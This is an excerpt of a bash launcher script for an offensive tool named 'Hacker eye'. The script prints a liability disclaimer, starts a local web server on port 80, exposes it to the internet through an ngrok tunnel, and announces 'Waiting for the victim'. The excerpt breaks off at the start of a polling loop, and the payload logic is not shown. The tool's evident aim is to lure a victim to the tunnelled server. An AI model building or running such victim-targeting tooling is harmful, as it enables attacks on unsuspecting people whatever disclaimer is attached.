...
sleep 0.5
clear
command -v gnome-terminal > /dev/null 2>&1 || { echo >&2 "I require gnome-terminal but it's not installed. Install it with ( sudo apt-get install gnome-terminal ) .... Aborting."; exit 1; }
printf "loading dependencies!....| " 
sleep 0.5
clear
printf "loading dependencies!..../"
...
printf "\n"
printf "    Disclaimer:\n"
printf "     \e[1;77m Developers assume no liability and are not      \n"
printf "     \e[1;77m responsible for any misuse or damage caused by Hacker eye.  \n"
printf "     \e[1;77m Only use for educational purporses!!                        \n"
printf "\n"
sleep 1
read -r -p $'\n\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] press enter to continue! \e[0m\en'
}
...
sleep 2
printf "the server started on --> 127.0.0.1:80\n"
sleep 0.5
printf "\e[1;92m[\e[0m*\e[1;92m] Starting ngrok server...\n"
sleep 0.5
gnome-terminal -e "./ngrok http 80"   --title="ngrok"
 
 

sleep 3
#printf "to make the server public open a new terminal window and in the same dir and \nrun:- sudo ./ngrok http 80\n"
...
printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Waiting for the victim ...\e[0m\n"
while [ true ]; do
